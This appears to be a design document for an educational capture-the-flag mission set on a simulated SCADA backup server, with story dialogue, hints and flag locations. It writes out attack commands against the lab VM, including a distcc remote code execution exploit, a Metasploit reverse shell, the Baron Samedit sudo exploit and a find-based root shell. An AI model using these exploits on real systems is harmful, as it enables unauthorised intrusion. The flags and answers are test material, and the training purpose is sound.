## Overview

This document specifies the complete SecGen virtual machine configuration for Mission 4 "Critical Failure," including scenario selection, network topology, vulnerability chain, flag placement, and integration with the narrative SCADA investigation theme.

---

## SecGen Scenario Selection

### Primary Scenario: "Vulnerability Analysis"

**Scenario Name:** `vulnerability_analysis`
**Difficulty:** Intermediate (Tier 2)
**Core Vulnerabilities:**
1. Network reconnaissance (Nmap)
2. Service enumeration (FTP, HTTP)
3. Legacy service exploitation (distcc)
4. Privilege escalation (sudo vulnerability - Baron)

**Narrative Fit:**
- Represents compromised SCADA backup server
- Contains ENTROPY attack planning intelligence
- Reveals cross-cell coordination evidence
- Supports 60-80 minute investigation timeline

**Educational Goals:**
- Network mapping and service discovery
- Web application analysis
- Legacy vulnerability exploitation
- Basic privilege escalation

---

## Network Topology

### SCADA Network Simulation

**Network Design:**
- VM represents backup SCADA server
- Simulates water treatment facility network
- Contains evidence of ENTROPY infiltration
- Network isolated from player's system (security)

**IP Configuration:**

```
Player Machine: 192.168.100.1 (host)
SCADA Backup Server: 192.168.100.10 (VM target)
```

**Network Services Exposed:**

| Port | Service | Version | Vulnerability |
|------|---------|---------|---------------|
| 21   | FTP     | vsftpd 2.3.4 | Weak credentials |
| 22   | SSH     | OpenSSH 7.4 | Secure (no exploit) |
| 80   | HTTP    | Apache 2.4 | Web app analysis |
| 3632 | distcc  | distcc 2.x | Remote code execution |

**Firewall Rules:**
- All ports accessible from player machine
- Outbound connections blocked (prevents exfiltration)
- Internal network simulation (no internet access)

---

## Vulnerability Chain & Flag Progression

### Challenge 1: Network Reconnaissance

**Objective:** Scan SCADA network and identify compromised systems
**Narrative Context:** "I need to identify which systems ENTROPY has compromised and map their attack infrastructure."

**Technical Task:**
```bash
# Player executes on VM terminal
nmap -sV -sC 192.168.100.10
```

**Expected Discoveries:**
- Open ports: 21 (FTP), 22 (SSH), 80 (HTTP), 3632 (distcc)
- Service versions identified
- Banner information revealing "SCADA Backup Server"

**Flag Location:** `/root/network_topology.txt`
**Flag Value:** `flag{network_scan_complete}`
**Access Method:** Flag appears after successful Nmap scan completion

**Hint System:**
- Robert Chen (radio): "Check the network infrastructure. We need to know what systems they're controlling."
- Terminal prompt: "Run network scan to identify active services"

**Validation:**
- Player must discover all 4 open ports
- Service version detection required
- Flag submission via drop-site terminal (Task 2.3)

---

### Challenge 2A: FTP Service Investigation

**Objective:** Access FTP server and gather attack planning intelligence

---

### Challenge 3: Legacy Service Exploitation (distcc)

**Objective:** Exploit distcc vulnerability to access attack control files
**Narrative Context:** "We need to find how they're controlling the attack. The backup server might have their control scripts."

**distcc Vulnerability:**
- **Service:** distcc daemon (distributed C/C++ compilation)
- **Port:** 3632
- **Vulnerability:** CVE-2004-2687 (Remote Code Execution)
- **Description:** distcc allows arbitrary code execution without authentication

**Technical Task:**
```bash
# Scan for distcc
nmap -p 3632 192.168.100.10

# Exploit using Metasploit or manual method
# Manual method for educational value:
echo 'DIST00000001\nARGC00000008\nARGV00000002gcc\nARGV00000002-c\nARGV00000008test.c\nARGV00000002-o\nARGV00000008test.o\nARGV00000009test.c\nDOTI00000000\n' | nc 192.168.100.10 3632

# Or use Metasploit module
use exploit/unix/misc/distcc_exec
set RHOST 192.168.100.10
set payload cmd/unix/reverse
exploit
```

**Initial Access:**
- Shell as user `distccd` (low privilege)
- Limited file system access
- Cannot read `/root/` directory (flag location)

**Privilege Escalation Required:** See Challenge 4

**Files Accessible (Low Privilege):**
```
/opt/scada_backup/
├── backup_schedules.txt
├── system_logs/
└── attack_vectors/
    ├── dosing_station_bypass.sh
    ├── scada_control_script.py
    └── trigger_mechanism.conf
```

**Intelligence from attack_vectors:**
- `dosing_station_bypass.sh`: Physical bypass device control script
- `scada_control_script.py`: Malicious SCADA automation script
- `trigger_mechanism.conf`: Remote trigger configuration (points to Voltage's laptop)

**Flag Location:** `/root/distcc_access_granted.txt`
**Access:** Requires privilege escalation to root

---

### Challenge 4: Privilege Escalation (sudo Baron)

**Objective:** Escalate privileges to access complete attack intelligence
**Narrative Context:** "We need full system access to identify all attack vectors and disabling mechanisms."

**Sudo Vulnerability:**
- **Type:** CVE-2021-3156 "Baron Samedit" (or similar sudo vulnerability)
- **Affected Version:** sudo 1.8.27
- **Description:** Heap-based buffer overflow in sudo

**Technical Task:**
```bash
# Check sudo version
sudo --version

# Check sudo permissions
sudo -l

# Output shows vulnerable sudo version
# Download/use exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./exploit

# Gain root shell
whoami
# Output: root
```

**Alternative Educational Path:**
```bash
# If Baron Samedit too complex, use simpler sudo misconfiguration
sudo -l
# Shows: (ALL) NOPASSWD: /usr/bin/find

# Exploit find with GTFOBins method
sudo find /etc -exec /bin/sh \;
# Gain root shell
```

**Root Access Gained:**

**Files Now Accessible:**
```
/root/
├── distcc_access_granted.txt (FLAG)
├── attack_control/
│   ├── disable_attack_procedure.txt
│   ├── scada_network_map.png
│   └── entropy_coordination_log.txt
└── optigrid_facilities_database.csv
```

**Flag Location:** `/root/distcc_access_granted.txt`
**Flag Value:** `flag{distcc_exploit_complete}`
**File Contents:**
```
SCADA BACKUP SERVER - ROOT ACCESS ACHIEVED

## Narrative-Technical Integration Points

### Task 2.2: Scan SCADA Network

**Trigger:** Player interacts with VM launcher terminal
**VM Action:** Launch vulnerability_analysis scenario
**Narrative Prompt:** "Examine the SCADA network to identify which systems ENTROPY has compromised."

**Player Actions:**
1. Launch VM from terminal
2. Execute Nmap scan on 192.168.100.10
3. Identify open services
4. Document network topology

**Flag Obtainment:** Network scan flag appears in `/root/network_topology.txt`
**Submission:** Player submits `flag{network_scan_complete}` at drop-site terminal

**Robert Chen Support (Radio):**
"Those SCADA systems shouldn't have those ports open. Someone's been modifying our network security. Document everything you find."

---

### Task 2.4: Investigate Compromised Services

**Narrative Prompt:** "Analyze the FTP and HTTP services for attack planning materials and intelligence."

**Player Actions:**
1. Access FTP server with optigrid credentials
2. Read attack planning documents
3. Access HTTP admin panel
4. Decode Base64 attack schedule

**Flags Obtainment:**
- FTP: `flag{ftp_intel_gathered}` from `/ftp_root/flag_intel.txt`
- HTTP: `flag{http_analysis_complete}` from decoded Base64 in HTML comments

**Intelligence Revelation:**
- Cross-cell coordination explicit
- Social Fabric cities identified (Seattle, Portland, Boise)
- OptiGrid Solutions cover company confirmed
- The Architect referenced

**Robert Chen Support:**
"OptiGrid Solutions... those were the maintenance technicians I authorized. My God, they had full access for three days."

**Agent 0x99 Call (After HTTP flag):**
"The intelligence you're gathering confirms our worst fears. Social Fabric coordinating with Critical Mass. This is unprecedented cell cooperation. Keep digging—we need to know the full attack mechanism."

---

### Task 2.7: Exploit Distcc Vulnerability

**Narrative Prompt:** "Exploit the vulnerable distcc service to access the attack control system."

**Player Actions:**
1. Identify distcc service (port 3632)
2. Exploit remote code execution vulnerability
3. Escalate privileges (sudo Baron or similar)
4. Access root directory
5. Read attack control files

**Flag Obtainment:** `flag{distcc_exploit_complete}` from `/root/distcc_access_granted.txt`

**Critical Intelligence:**
- All three attack vectors revealed
- Disabling procedure documented
- Confirms need to confront Voltage

**Robert Chen Support:**
"Three attack vectors? They built in redundancy. We'll need to disable all three or the attack still executes. The physical bypass devices are in chemical storage—I'll guide you through disabling them when you're ready."

**Agent 0x99 Call (After distcc flag):**
"Excellent work. You've identified the complete attack mechanism. New priority: capture Voltage if possible during the neutralization phase. We need intelligence on The Architect's larger infrastructure initiative."

---

## Difficulty Balancing

### Intermediate Player Expectations

**Target Skill Level:**
- Completed M1-M3 (basic VM challenges)
- Familiar with Nmap, basic exploitation
- Understands privilege escalation concepts
- 30-40 minutes estimated completion time

**Challenge Progression:**

1. **Network Scan (Easy):**
   - Straightforward Nmap command
   - Clear instructions in narrative
   - Flag easily obtainable

2. **Service Investigation (Easy-Moderate):**
   - FTP: Weak credentials guessable or hinted
   - HTTP: Base64 decoding educational but not difficult
   - Flags clearly marked in files

3. **distcc Exploitation (Moderate):**
   - Requires research or tool usage (Metasploit)
   - Privilege escalation adds complexity
   - Educational about legacy vulnerabilities

**Hint System:**

**Level 1 (Subtle - Robert Chen):**
- "Check the network infrastructure"
- "OptiGrid had access to our FTP server"
- "The web interface shows modified parameters"

**Level 2 (Specific - Terminal Prompts):**
- "Run Nmap scan on 192.168.100.10"
- "Try common maintenance credentials on FTP"
- "Check HTML source for encoded data"

**Level 3 (Explicit - Agent 0x99 if stuck):**
- "Use Nmap to scan all ports on the backup server"
- "Common OptiGrid credentials: optigrid/maintenance2024"
- "Base64-encoded data is in the HTML comments of the admin panel"

**No Level 4 Needed:** No super-difficult challenges that require maximum hints
